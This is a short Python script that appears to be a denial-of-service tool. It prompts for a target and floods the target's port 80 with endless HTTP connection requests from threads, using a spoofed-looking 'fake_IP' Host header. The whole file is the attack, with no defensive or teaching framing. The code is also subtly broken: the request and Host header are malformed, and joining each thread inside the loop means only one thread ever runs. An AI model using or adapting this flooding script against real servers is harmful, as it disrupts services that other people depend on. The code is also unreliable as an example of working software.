import socket
from threading import Thread
import threading

target = input("Target: ").strip()
port = 80

fake_IP = "192.168.1.1"

def Attack():
    while True:
        initial = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        initial.connect((target,port))

        initial.sendto((f"GET / {target} HTTP/1.1\r\n").encode('ascii'),(target,port))
        initial.sendto((f"Host:  + {fake_IP} \r\n\r\n ").encode('ascii'),(target,port))
        initial.close()


for _ in range(20):
    beging = Thread(target=Attack)
    beging.start()
    beging.join()
